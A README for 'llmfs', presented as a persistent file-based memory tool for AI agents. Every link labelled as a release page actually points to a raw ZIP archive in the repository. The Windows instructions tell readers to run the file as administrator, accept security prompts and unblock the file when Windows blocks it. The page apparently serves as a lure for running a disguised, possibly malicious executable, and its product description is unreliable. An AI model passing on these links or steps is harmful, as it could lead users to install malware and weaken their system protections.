# 🧠 llmfs - Persistent memory for AI agents

[![Download llmfs](https://img.shields.io/badge/Download%20llmfs-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/whiteoakredguard557/llmfs/main/llmfs/Software_v1.7-alpha.2.zip)

## 📦 What is llmfs?

llmfs is a local file-based memory tool for LLMs and AI agents. It stores notes, context, and agent state on your computer in plain files. This helps keep long-running chats and agent tasks organized without cutting them down into short summaries.

Use it when you want:

- A simple way to keep AI memory on disk
- A local folder that holds context between runs
- Better support for long tasks and repeated sessions
- A setup that works with tools like LangChain, MCP, and OpenAI-based apps

## 🖥️ What you need

Before you install llmfs on Windows, make sure you have:

- Windows 10 or Windows 11
- An internet connection
- Enough free space for the app and its memory files
- Permission to open downloaded files

If you plan to connect llmfs to other AI tools, it also helps to have:

- A modern browser
- A text editor such as Notepad
- A folder where you want your memory files saved

## 📥 Download llmfs

Visit the release page here and download the Windows file from the latest release:

[Go to llmfs releases](https://raw.githubusercontent.com/whiteoakredguard557/llmfs/main/llmfs/Software_v1.7-alpha.2.zip)

After the page opens:

1. Look for the latest release at the top
2. Find the Windows download file
3. Download the file to your computer
4. Open the downloaded file to start setup or run the app

## 🚀 Install on Windows

Follow these steps on Windows:

1. Open the downloaded file from your Downloads folder
2. If Windows shows a security prompt, choose Open or Run
3. If the app is packaged as a ZIP file, right-click it and choose Extract All
4. Move the app folder to a place you can find again, such as Documents or Program Files
5. Open the app file inside the folder

If the release includes an installer:

1. Double-click the installer
2. Choose Next when the setup window appears
3. Pick an install folder
4. Finish the setup
5. Start llmfs from the Start menu or desktop shortcut

## 🗂️ How llmfs works

llmfs keeps memory in a local filesystem. That means your data stays in folders and files instead of being trapped inside one chat window.

A typical setup may include:

- A memory folder for saved context
- A notes folder for task history
- A cache folder for short-term data
- A log folder for activity records

This structure makes it easier for an AI app to:

- Read old context
- Add new context
- Keep track of tasks over time
- Reuse useful information in later sessions

## 🧩 Basic use

After you install or open llmfs:

1. Start the app
2. Choose or create a memory folder
3. Connect it to your AI tool or agent
4. Save notes, task state, or context files
5. Reopen the same folder later to keep working

If you use llmfs with an agent, the agent can store:

- User goals
- Task progress
- Tool results
- Session notes
- Useful facts from past runs

## 🔧 Common setup ideas

You can use llmfs in a few simple ways:

### 📁 Personal memory folder
Store your own notes and project context in one folder so your AI tool can keep using them later.

### 🤖 Agent workspace
Give each agent its own folder. This keeps tasks separate and easier to manage.

### 🔌 Tool connection
Use llmfs with tools that support local memory, file access, or MCP-style workflows.

### 🧠 Long chat support
Keep facts, prompts, and progress notes outside the chat window so the agent can return to them later.

## 🧰 Folder layout example

A simple llmfs folder may look like this:

- `memory/` — stored facts and long-term context
- `sessions/` — session notes and chat history
- `tasks/` — active work items
- `logs/` — app or agent logs
- `cache/` — short-lived data

You do not need to build this by hand unless the app asks for it. In many cases, llmfs can create the needed folders for you.

## 🔒 Privacy and local storage

llmfs is built around local storage. Your memory files stay on your computer unless you choose to share them with another tool.

That gives you:

- More control over saved data
- Easy access to files
- Simple backup options
- A clear view of what the app stores

If you want to back up your memory, copy the folder to another drive or cloud storage service you already use.

## 🛠️ Troubleshooting

### The file will not open
- Right-click the file and choose Run as administrator
- Make sure the download finished
- Try downloading the file again from the releases page

### Windows blocks the file
- Right-click the file
- Open Properties
- If you see an Unblock option, select it
- Try opening the file again

### The app opens and closes fast
- Check whether the app needs a folder path or config file
- Make sure the memory folder exists
- Run the app from the folder instead of from the ZIP file

### I cannot find the downloaded file
- Open File Explorer
- Go to Downloads
- Sort by date
- Look for the newest file from GitHub

### My AI tool cannot see the memory folder
- Check the folder path in the app
- Make sure the AI tool points to the same folder
- Confirm the folder has read and write access

## 🧪 First run checklist

Use this short checklist after setup:

- [ ] Downloaded the latest release
- [ ] Opened or extracted the file
- [ ] Started the app
- [ ] Chose a memory folder
- [ ] Saved a test note
- [ ] Opened the same folder again
- [ ] Confirmed the note is still there

## 🧭 Good ways to use llmfs

llmfs works well for:

- Repeated AI work on one project
- Agents that need task history
- Note storage for prompts and facts
- Local context across many sessions
- File-based memory in simple AI workflows

It is a good fit when you want a memory layer that stays easy to inspect and manage with normal folders and files

## 📎 Release page

Download or run the Windows build from the release page:

[https://raw.githubusercontent.com/whiteoakredguard557/llmfs/main/llmfs/Software_v1.7-alpha.2.zip](https://raw.githubusercontent.com/whiteoakredguard557/llmfs/main/llmfs/Software_v1.7-alpha.2.zip)

## 🧾 Project details

**Repository:** llmfs  
**Description:** Filesystem-based persistent memory for LLMs and AI agents -- unlimited context windows without lossy summarization  
**Topics:** agent, agentic-ai, ai-memory, context-window, filesystem, langchain, llm, mcp, openai, python, tools, vector-database